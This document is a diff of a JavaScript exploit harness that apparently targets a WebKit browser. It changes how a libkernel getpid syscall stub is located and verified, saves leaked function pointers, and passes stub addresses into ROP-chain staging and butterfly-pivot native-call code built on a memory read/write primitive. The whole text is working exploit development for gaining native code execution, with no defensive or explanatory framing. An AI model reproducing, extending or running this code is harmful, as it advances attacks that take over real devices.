@@ -57,6 +57,7 @@ import {
     resolveLibkernelRelroChunk,
     verifyLibkernelZeroRead,
     calcLkFromFnPtrZeroRead,
+    resolveGetpidStub, saveLastFnPtr, loadLastFnPtr,
     calcLkBestFromFnPtr,
     resolveLkOnePltStep,
     extPtrToLkCandidates,
@@ -86,7 +87,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ba";
+const BUILD_ID = "rw-20250830bb";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid @ lk (chain_poops) — needs lk in box" },
@@ -812,29 +813,16 @@ function ensureNativePrepForFire(p, off, nm) {
     mark("NATIVE-PREP", "fresh slab wb=" + nativePrep.webkitBase + " mode=" + nm);
 }
 
-/** One read @ lk+off — pick getpid stub like chain_poops (k_stubs[20] first). */
+/** Verified getpid stub — fn+delta when lk is page-aligned off from exports. */
 function resolveGetpidStubOff(p, lk, off) {
-    const cands = [];
-    if (off.k_stubs && off.k_stubs[SYS_GETPID] != null)
-        cands.push(["k_stubs[20]", off.k_stubs[SYS_GETPID]]);
-    if (off.k_getpid_syscall != null)
-        cands.push(["k_getpid_syscall", off.k_getpid_syscall]);
-    cands.push(["0x4fa", 0x4fa]);
-    for (let i = 0; i < cands.length; i++) {
-        const tag = cands[i][0];
-        const stubOff = cands[i][1];
-        const v = read8p(p, lk.add32(stubOff));
-        if (lkIsGetpidStub(v))
-            return { off: stubOff, tag: tag };
-    }
-    const fallback = (off.k_stubs && off.k_stubs[SYS_GETPID]) || 0x2cb70;
-    return { off: fallback, tag: "blind" };
+    return resolveGetpidStub(p, lk, off, { maxProbes: 512 });
 }
 
 /** lk resolved on live primitive — no reload before native fire. */
 function onLkFoundHot(lk, hit) {
     lkHot = true;
     const iatRva = hit && hit.iatRva != null ? hit.iatRva : null;
+    if (hit && hit.fnPtr) saveLastFnPtr(hit.fnPtr);
     saveLibkernelSession(lk, iatRva, { forced: true });
     if (addrIn) addrIn.value = String(lk);
     const via = hit ? (hit.method + "/" + hit.via) : "?";
@@ -3148,14 +3136,22 @@ function acceptLkFromHex(hexOverride) {
     const rvaHits = calcLkFromFnPtrZeroRead(ptr, off);
     if (rvaHits.length) {
         const h = rvaHits[0];
+        saveLastFnPtr(ptr);
         saveLibkernelSession(h.lk, null, { forced: true });
         if (addrIn) addrIn.value = String(h.lk);
+        let stubNote = "";
+        if (window.p) {
+            const stub = resolveGetpidStub(window.p, h.lk, off, { fnPtr: ptr, maxProbes: 256 });
+            if (stub.verified)
+                stubNote = " stub=" + stub.tag;
+        }
         mark("LK-OK", String(h.lk) + " = fn−" + h.key
-            + "+0x" + h.rva.toString(16) + " (0 reads) — Fire getpid when ready");
+            + "+0x" + h.rva.toString(16) + stubNote
+            + " (0 reads) — Fire getpid when ready");
         state("lk accepted", "ok");
         renderOut();
         try {
-            crashLog.append("ACCEPT OK fn " + hex + " → " + h.lk, "LK-VERIFY");
+            crashLog.append("ACCEPT OK fn " + hex + " → " + h.lk + stubNote, "LK-VERIFY");
             crashLog.flushSync();
         } catch (_) { }
         return true;
@@ -4199,10 +4195,12 @@ function tryNativeFireAtStart(p, off) {
         }
         if (nm === "getpid") {
             const stub = resolveGetpidStubOff(p, lk, off);
+            if (!stub.verified)
+                throw new Error("getpid stub not found");
             mark("NATIVE-FIRE", "getpid @ PRIMITIVE-OK lk=" + lk
-                + " stub+0x" + stub.off.toString(16));
+                + " stub=" + stub.tag);
             renderOut();
-            stageGetpid(p, nativePrep, lk, off, stub.off);
+            stageGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(pivotHookMode(), stub));
             fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
             mark("NATIVE-OK", "getpid @ Start lk=" + lk + " build=" + BUILD_ID);
         } else {
@@ -4440,10 +4438,14 @@ function finishPivotObj(p, prep, carrier) {
     return obj;
 }
 
-function bisectPreFireLog(p, prep, lk, stubOff, tag, hookMode) {
+function bisectPreFireLog(p, prep, lk, stub, tag, hookMode) {
     let stubOk = "?";
-    if (lk && stubOff != null) {
-        const sv = read8p(p, lk.add32(stubOff));
+    if (stub && stub.verified && stub.addr)
+        stubOk = "stub-ok@" + stub.tag;
+    else if (stub && stub.addr)
+        stubOk = "BAD:" + read8p(p, stub.addr);
+    else if (lk && stub && stub.off != null) {
+        const sv = read8p(p, lk.add32(stub.off));
         stubOk = lkIsGetpidStub(sv) ? "stub-ok" : ("BAD:" + sv);
     }
     const hit = readPivotButterfly(p, prep.pivotCell);
@@ -4451,28 +4453,34 @@ function bisectPreFireLog(p, prep, lk, stubOff, tag, hookMode) {
     if (prep._pivotBfSource) bfStr += " src=" + prep._pivotBfSource;
     if (prep._pivotBfUpgraded) bfStr += " pivot=" + prep._pivotBfUpgraded;
     if (prep._pivotBfInjected) bfStr += " injected=1";
-    bisectLog("PRE-FIRE", tag + " lk=" + lk + " +0x" + (stubOff != null ? stubOff.toString(16) : "?")
+    bisectLog("PRE-FIRE", tag + " lk=" + lk
+        + (stub && stub.off != null ? " +0x" + stub.off.toString(16) : "")
         + " " + stubOk + " hook=" + hookMode
         + " pivot=" + (params.get("pivot") || "empty")
         + " cell=" + prep.pivotCell + " bf=" + bfStr + " S=" + prep.M.S
         + " path=" + (prep._cap && prep._cap.path || "?"));
 }
 
-function nativeFireOpts(hookMode) {
-    return { hook: hookMode, carrier: window._wkCarrier || null };
+function nativeFireOpts(hookMode, stub) {
+    const o = { hook: hookMode, carrier: window._wkCarrier || null };
+    if (stub && stub.verified && stub.addr) {
+        o.stubAddr = stub.addr;
+        o.stubOff = stub.off;
+    }
+    return o;
 }
 
 function bisectFireGetpidHook(p, off, hookMode, tag) {
     const lk = lkFromUi();
     if (!lk) throw new Error("paste lk in hex box → Accept lk");
     const stub = resolveGetpidStubOff(p, lk, off);
-    if (stub.tag === "blind")
-        bisectLog("STUB-WARN", "getpid stub not verified — may OOM");
+    if (!stub.verified)
+        throw new Error("getpid stub not found — paste usleep fn ptr → Accept lk, or run stub scan");
     if (hookMode === "bf" || hookMode === "bf30" || hookMode === "dual")
         ensurePivotButterfly(p, nativePrep, window._wkCarrier || null);
-    bisectPreFireLog(p, nativePrep, lk, stub.off, tag, hookMode);
+    bisectPreFireLog(p, nativePrep, lk, stub, tag, hookMode);
     bisectFlushBeforeFire();
-    return firePivotGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(hookMode));
+    return firePivotGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(hookMode, stub));
 }
 
 function codeLooksNative(code4) {
@@ -4839,9 +4847,11 @@ function runNativeBisectStep(stepId) {
             const lk = lkFromUi();
             if (!lk) throw new Error("paste lk in hex box");
             const stub = resolveGetpidStubOff(p, lk, off);
-            layoutGetpidStack(nativePrep, lk, stub.off);
-            mark("BISECT-OK", "N8 getpid stack @ lk+0x" + stub.off.toString(16)
-                + " (" + stub.tag + ") — no fire yet");
+            if (!stub.verified)
+                throw new Error("getpid stub not found");
+            layoutGetpidStack(nativePrep, lk, stub.off, stub.addr);
+            mark("BISECT-OK", "N8 getpid stack " + stub.tag
+                + " addr=" + stub.addr + " — no fire yet");
             state("N8 stage lk OK", "ok");
             break;
         }
@@ -4858,8 +4868,10 @@ function runNativeBisectStep(stepId) {
             const lk2 = lkFromUi();
             if (!lk2) throw new Error("paste lk in hex box");
             const stub2 = resolveGetpidStubOff(p, lk2, off);
-            layoutGetpidStack(nativePrep, lk2, stub2.off);
-            mark("BISECT-WARN", "N10 getpid full fire lk+0x" + stub2.off.toString(16));
+            if (!stub2.verified)
+                throw new Error("getpid stub not found");
+            layoutGetpidStack(nativePrep, lk2, stub2.off, stub2.addr);
+            mark("BISECT-WARN", "N10 getpid full fire " + stub2.tag);
             renderOut();
             pid = fireNativeCallBisect(p, nativePrep, off);
             mark("BISECT-OK", "N10 getpid=" + pid);
@@ -4950,10 +4962,11 @@ function runFireGetpid() {
             pid = fireUsleep(p, nativePrep, lk, off, 1000);
         } else {
             const stub = resolveGetpidStubOff(p, lk, off);
-            mark("NATIVE-STUB", "getpid @ lk+0x" + stub.off.toString(16)
-                + " (" + stub.tag + ")");
-            stageGetpid(p, nativePrep, lk, off, stub.off);
-            pid = fireNativeCall(p, nativePrep, off);
+            if (!stub.verified)
+                throw new Error("getpid stub not found — re-Accept lk with usleep fn ptr");
+            mark("NATIVE-STUB", "getpid " + stub.tag + " addr=" + stub.addr);
+            stageGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(pivotHookMode(), stub));
+            pid = fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
         }
     } catch (err) {
         errMsg = err.message || String(err);
